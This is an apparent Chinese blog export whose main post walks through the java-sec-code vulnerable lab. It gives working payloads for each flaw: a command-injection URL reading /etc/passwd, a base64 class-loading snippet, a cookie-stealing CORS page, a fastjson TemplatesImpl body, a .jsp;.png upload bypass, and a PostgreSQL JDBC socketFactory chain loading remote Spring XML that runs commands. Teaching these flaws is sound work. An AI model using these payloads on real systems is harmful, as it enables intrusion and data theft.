[{"title":"java-sec-code之入门审计（一）","url":"/2025/07/25/java-sec-code%E4%B9%8B%E5%85%A5%E9%97%A8%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%80%EF%BC%89/","content":"<h2 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h2><p>​\tjava-sec-code项目是专门为java代码安全开发设计的，特别适合新手快速理解上手java代码中的漏洞形式。由于漏洞种类很多，这里我分为几部分去写。</p>\n<p>​\t环境搭建——jdk8u65–docker-compose up—idea启动</p>\n<h2 id=\"命令注入\"><a href=\"#命令注入\" class=\"headerlink\" title=\"命令注入\"></a>命令注入</h2><p>不安全情况</p>\n<p>​\t访问对应的路由，传入参数，并且idea开启调试</p>\n<p><img src=\"/images/1.png\"></p>\n<p>可以看到获取的filepath参数直接传入ProcessBuilder</p>\n<p>​\tProcessBuilder构造函数接受String字符串新建进程，执行对应命令，这里新建sh进程，执行了ls和ping命令。不过需要注意的是，new的时候不会直接创建进程，而是要等到Process process &#x3D; builder.start();才会创建对应传入字符串的进程。</p>\n<p><img src=\"/images/2.png\" alt=\"image-20250720221247244\"></p>\n<p>安全情况</p>\n<p>​\t访问&#x2F;codeinject&#x2F;sec?filepath&#x3D;&#x2F;tmp;cat%20&#x2F;etc&#x2F;passwd，打断点。可以看到这里有一个filter，我们进去看看怎么实现的</p>\n<p><img src=\"/images/3.png\" alt=\"image-20250720223425787\"></p>\n<p>​\tctrl左键键点击cmdFilter，可以看到有个if判断，if没匹配上，则返回null，否则返回input，也就是我们最初传入的filepath</p>\n<p><img src=\"/images/4.png\" alt=\"image-20250720224717162\"></p>\n<p>​\t这里顺便说一下FILTER_PATTERN是正则表达式的模板对象，是Pattern类型，Pattern类用于表示编译后的正则表达式</p>\n<p>​\t我们左键跟进FILTER_PATTERN，可以看到他如何生成的模板对象(通过Pattern的.compile方法)</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">Pattern</span> <span class=\"variable\">FILTER_PATTERN</span> <span class=\"operator\">=</span> Pattern.compile(<span class=\"string\">&quot;^[a-zA-Z0-9_/\\\\.-]+$&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>​\t这里我们可以看到正则表达式匹配的内容，也就是说我们传入的;和空格是非法的，所以会return “Bad boy. I got u.”;</p>\n<p>​\t可以验证一下，我们把非法的删掉，再传入。这里没有被抓到，只是说目录不存在，验证猜想。可以想想是否有办法绕过呢？</p>\n<p><img src=\"/images/5.png\" alt=\"image-20250720225316420\"></p>\n<h2 id=\"类加载（ClassDataLoader）\"><a href=\"#类加载（ClassDataLoader）\" class=\"headerlink\" title=\"类加载（ClassDataLoader）\"></a>类加载（ClassDataLoader）</h2><p>这里我们另起炉灶。先写一个静态代码块里弹计算器的类，然后javac编译成.class，再base64编码，赋值给classData，成功弹计算器，涉及反射内容。在调用 defineClass 后，类只是被加载，还未初始化。直到调用 getDeclaredConstructor().newInstance() 或其他方式实例化类，才会触发静态代码块。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Test</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">classData</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;yv66vgAAADQAIQoACAASCgATABQIABUKABMAFgcAFwoABQAYBwAZBwAaAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAFwEAClNvdXJjZUZpbGUBAAhFeHAuamF2YQwACQAKBwAbDAAcAB0BABJvcGVuIC1hIENhbGN1bGF0b3IMAB4AHwEAE2phdmEvbGFuZy9FeGNlcHRpb24MACAACgEADG9yZy90ZXN0L0V4cAEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABwAIAAAAAAACAAEACQAKAAEACwAAAB0AAQABAAAABSq3AAGxAAAAAQAMAAAABgABAAAAAwAIAA0ACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAAAgACQALAAwACQANAAoAEQAMAA4AAAAHAAJMBwAPBAABABAAAAACABE=&quot;</span>;</span><br><span class=\"line\">            <span class=\"type\">byte</span>[] classBytes = java.util.Base64.getDecoder().decode(classData);</span><br><span class=\"line\">            java.lang.reflect.<span class=\"type\">Method</span> <span class=\"variable\">defineClassMethod</span> <span class=\"operator\">=</span> ClassLoader.class.getDeclaredMethod(</span><br><span class=\"line\">                    <span class=\"string\">&quot;defineClass&quot;</span>, String.class, <span class=\"type\">byte</span>[].class, <span class=\"type\">int</span>.class, <span class=\"type\">int</span>.class);</span><br><span class=\"line\">            defineClassMethod.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">            Class&lt;?&gt; cc = (Class&lt;?&gt;) defineClassMethod.invoke(</span><br><span class=\"line\">                    ClassLoader.getSystemClassLoader(), <span class=\"literal\">null</span>, classBytes, <span class=\"number\">0</span>, classBytes.length);</span><br><span class=\"line\">          <span class=\"comment\">//===============================</span></span><br><span class=\"line\">            cc.getDeclaredConstructor().newInstance(); <span class=\"comment\">// 替代 deprecated 的 newInstance()</span></span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"cors\"><a href=\"#cors\" class=\"headerlink\" title=\"cors\"></a>cors</h2><p>我们看对应代码，获取origin请求头并且设置为自己的响应头。这样，我们就可以起一个网页，让受害者访问我们的网页后发起一个跨域请求，在进行跨域请求的时候带上目标网站的cookie，从而获取到该受害者对应账号、对应功能点的数据。</p>\n<p>这里有个小知识，fetch&#x2F;xhr&#x2F;form表单进行跨域请求的时候会自动带上origin头</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RequestMapping(&quot;/cors&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Cors</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">String</span> <span class=\"variable\">info</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;&#123;\\&quot;name\\&quot;: \\&quot;JoyChou\\&quot;, \\&quot;phone\\&quot;: \\&quot;18200001111\\&quot;&#125;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@GetMapping(&quot;/vuln/origin&quot;)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">vuls1</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">origin</span> <span class=\"operator\">=</span> request.getHeader(<span class=\"string\">&quot;origin&quot;</span>);</span><br><span class=\"line\">        response.setHeader(<span class=\"string\">&quot;Access-Control-Allow-Origin&quot;</span>, origin); <span class=\"comment\">// set origin from header</span></span><br><span class=\"line\">        response.setHeader(<span class=\"string\">&quot;Access-Control-Allow-Credentials&quot;</span>, <span class=\"string\">&quot;true&quot;</span>);  <span class=\"comment\">// allow cookie</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> info;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们py起一个网页，网页代码如下，发起跨域请求，看是否能够获取数据</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>跨域信息窃取演示<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>正在尝试窃取信息...<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"title function_\">fetch</span>(<span class=\"string\">&quot;http://localhost:8081/cors/vuln/origin&quot;</span>, &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">credentials</span>: <span class=\"string\">&quot;include&quot;</span> <span class=\"comment\">// 携带用户的 cookie</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    .<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">response</span> =&gt;</span> response.<span class=\"title function_\">text</span>())</span></span><br><span class=\"line\"><span class=\"language-javascript\">    .<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">data</span> =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&quot;✅ 窃取成功，内容如下：&quot;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(data); <span class=\"comment\">// 🚨 打印窃取的敏感信息到控制台</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    .<span class=\"title function_\">catch</span>(<span class=\"function\"><span class=\"params\">err</span> =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"variable language_\">console</span>.<span class=\"title function_\">error</span>(<span class=\"string\">&quot;❌ 窃取失败：&quot;</span>, err);</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;);</span></span><br><span class=\"line\"><span class=\"language-javascript\">  </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>成功，如图，可以看到发起了两次请求，并且访问origin端点的时候成功获取信息</p>\n<p><img src=\"/images/6.png\" alt=\"image-20250722153721783\"></p>\n<p>修复方案：白名单、加csrf token。具体代码可以参考项目中。</p>\n<h2 id=\"crlf\"><a href=\"#crlf\" class=\"headerlink\" title=\"crlf\"></a>crlf</h2><p>jdk8会对头进行过滤\\r\\n，不会存在这个漏洞</p>\n<h2 id=\"fastjson\"><a href=\"#fastjson\" class=\"headerlink\" title=\"fastjson\"></a>fastjson</h2><p>这里不深入分析。找到fastjson的代码，我们可以看见是直接接收整个请求体，注意是ct是json</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Controller</span></span><br><span class=\"line\"><span class=\"meta\">@RequestMapping(&quot;/fastjson&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Fastjson</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(value = &quot;/deserialize&quot;, method = &#123;RequestMethod.POST&#125;)</span></span><br><span class=\"line\">    <span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">Deserialize</span><span class=\"params\">(<span class=\"meta\">@RequestBody</span> String params)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 如果Content-Type不设置application/json格式，post数据会被url编码</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 将post提交的string转换为json</span></span><br><span class=\"line\">            <span class=\"type\">JSONObject</span> <span class=\"variable\">ob</span> <span class=\"operator\">=</span> JSON.parseObject(params,Feature.SupportNonPublicField);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> ob.get(<span class=\"string\">&quot;name&quot;</span>).toString();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> e.toString();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>请求体，这里我们根据代码下面提示直接TemplatesImpl。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,</span><br><span class=\"line\">  &quot;_bytecodes&quot;: [&quot;这里是base64编码的gadget&quot;],</span><br><span class=\"line\">  &quot;_name&quot;: &quot;lightless&quot;,</span><br><span class=\"line\">  &quot;_tfactory&quot;: &#123;&#125;,</span><br><span class=\"line\">  &quot;_outputProperties&quot;: &#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"文件上传\"><a href=\"#文件上传\" class=\"headerlink\" title=\"文件上传\"></a>文件上传</h2><p>这里有两个接口，一个是任意文件上传的接口，一个是让上传图片的接口。任意文件上传就不说了，可以看看上传image的代码。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@PostMapping(&quot;/upload/picture&quot;)</span></span><br><span class=\"line\">   <span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\">   <span class=\"keyword\">public</span> String <span class=\"title function_\">uploadPicture</span><span class=\"params\">(<span class=\"meta\">@RequestParam(&quot;file&quot;)</span> MultipartFile multifile)</span> </span><br></pre></td></tr></table></figure>\n\n<p>可以看到代码里面用到了几个方法，都是当前类的方法。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">convert\t//生成随机文件名的文件</span><br><span class=\"line\">isImag  //判断是否是图片 BufferedImage bi = ImageIO.read(file);</span><br></pre></td></tr></table></figure>\n\n<p>在uploadPicture方法中，设置了文件后缀名白名单，MIME黑名单。观察下面代码，这种获取文件后缀名的方式可以通过双后缀名绕过，比如说.jsp;.png，并且结合一些解析漏洞或者tomcat自己本身的特性导致最终落地文件为非png。（nginx只根据最后一个后缀判断MIME，tomcat则把；后的识别为参数列表）</p>\n<p><img src=\"/images/7.png\" alt=\"image-20250724110727137\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">String Suffix = fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); // 获取文件后缀名</span><br><span class=\"line\">...</span><br><span class=\"line\">if (Suffix.toLowerCase().equals(white_suffix))</span><br></pre></td></tr></table></figure>\n\n<p>顺便说一下，文件解析的时候分为几种情况。浏览器解析文件的时候根据Content-Type，web服务器文件落地是根据文件后缀名解析，Java后端处理文件则是根据文件内容（magic number），此时ct和后缀名都可以忽略。</p>\n<p>通过通读代码，我们还可以发现，生成uuid文件名，只用于检验文件内容就消除了，最终落地的文件名没有用到convert。</p>\n<h2 id=\"JDBC\"><a href=\"#JDBC\" class=\"headerlink\" title=\"JDBC\"></a>JDBC</h2><p>兴致来了，简单调试一下，参考文章<a href=\"https://tttang.com/archive/1462/\">https://tttang.com/archive/1462/</a></p>\n<p>异常跟踪时，可能会出现行号对不上的情况，注意上下文看看。甚至会出现在另外一个方法里，我这里调试的时候就出现了这个问题。</p>\n<p>Property是指在建立连接时支持的JDBC连接属性。</p>\n<p>先写一个测试代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> SQLException &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">jdbcUrl</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=&amp;socketFactoryArg=&quot;</span>;</span><br><span class=\"line\">  \t\t\t</span><br><span class=\"line\">        DriverManager.getConnection(jdbcUrl);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们看看sink点instantiate方法，可以发现通过反射去实例化对象。注意cls.getConstructor(String.class);，也就是我们需要找到一个构造方法只有一个String形参的恶意类。参考p神（<a href=\"https://www.leavesongs.com/PENETRATION/springboot-xml-beans-exploit-without-network.html%EF%BC%89%E3%80%82%E2%80%9C%E8%BF%99%E4%B8%A4%E4%B8%AA%E7%B1%BB%E6%98%AFSpring%E4%B8%AD%E7%94%A8%E4%BA%8E%E5%8A%A0%E8%BD%BDXML%E6%A0%BC%E5%BC%8F%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E7%B1%BB%EF%BC%8C%E7%94%B1%E4%BA%8E%E5%85%B6%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1%E3%80%81%E8%B0%83%E7%94%A8%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%EF%BC%8C%E9%80%9A%E5%B8%B8%E4%BC%9A%E4%BD%9C%E4%B8%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9A%84%E4%B8%80%E4%B8%AA%E9%87%8D%E8%A6%81%E5%88%A9%E7%94%A8%E9%93%BE%E3%80%82%E4%B8%8D%E8%BF%87%E8%BF%99%E4%B8%A4%E4%B8%AA%E7%B1%BB%E5%8F%AA%E8%83%BD%E5%8A%A0%E8%BD%BDURL%EF%BC%8C%E6%97%A0%E6%B3%95%E7%9B%B4%E6%8E%A5%E5%B0%86XML%E4%BC%A0%E5%85%A5%EF%BC%8C%E6%88%91%E4%BB%AC%E9%80%9A%E5%B8%B8%E8%AE%A4%E4%B8%BA%E9%9C%80%E8%A6%81%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8BXML%E6%96%87%E4%BB%B6%EF%BC%8C%E6%88%96%E8%80%85%E5%85%88%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0%E5%86%99%E6%96%87%E4%BB%B6%E6%89%8D%E8%83%BD%E5%88%A9%E7%94%A8%E3%80%82%E2%80%9D\">https://www.leavesongs.com/PENETRATION/springboot-xml-beans-exploit-without-network.html）。“这两个类是Spring中用于加载XML格式配置文件的类，由于其中可以实例化对象、调用静态方法，通常会作为漏洞利用的一个重要利用链。不过这两个类只能加载URL，无法直接将XML传入，我们通常认为需要加载远程XML文件，或者先通过本地写文件才能利用。”</a></p>\n<ul>\n<li><p>org.springframework.context.support.ClassPathXmlApplicationContext</p>\n</li>\n<li><p>org.springframework.context.support.FileSystemXmlApplicationContext</p>\n<p>这里classname是我们可控的。</p>\n</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Object <span class=\"title function_\">instantiate</span><span class=\"params\">(String classname, Properties info, <span class=\"type\">boolean</span> tryString, String stringarg)</span> <span class=\"keyword\">throws</span> ClassNotFoundException, SecurityException, NoSuchMethodException, IllegalArgumentException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class=\"line\">        Object[] args = <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;info&#125;;</span><br><span class=\"line\">        Constructor&lt;?&gt; ctor = <span class=\"literal\">null</span>;</span><br><span class=\"line\">        Class&lt;?&gt; cls = Class.forName(classname);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            ctor = cls.getConstructor(Properties.class);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (NoSuchMethodException var9) &#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (tryString &amp;&amp; ctor == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                ctor = cls.getConstructor(String.class);</span><br><span class=\"line\">                args = <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;stringarg&#125;;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (NoSuchMethodException var8) &#123;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ctor == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            ctor = cls.getConstructor();</span><br><span class=\"line\">            args = <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> ctor.newInstance(args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>?socketFactory&#x3D;恶意类名&amp;socketFactoryArg&#x3D;其构造器的参数。python起服务，放入xml，再运行，成功弹计算器。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> SQLException &#123;</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">jdbcUrl</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http://localhost/2.xml&quot;</span>;</span><br><span class=\"line\">    DriverManager.getConnection(jdbcUrl);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;pb&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;java.lang.ProcessBuilder&quot;</span> <span class=\"attr\">init-method</span>=<span class=\"string\">&quot;start&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span> &gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>open<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>-a<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>calculator<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">constructor-arg</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/8.png\" alt=\"image-20250724170036442\"></p>\n<p>sslFactory也是差不多的流程，都是在instantiate方法中可控实例化对象。</p>\n"},{"title":"Hello World","url":"/2025/07/16/hello-world/","content":"<h1 id=\"由于买不起阿里云主机，决定在github重生归来，这一世，我要…\"><a href=\"#由于买不起阿里云主机，决定在github重生归来，这一世，我要…\" class=\"headerlink\" title=\"由于买不起阿里云主机，决定在github重生归来，这一世，我要…\"></a>由于买不起阿里云主机，决定在github重生归来，这一世，我要…</h1>"}]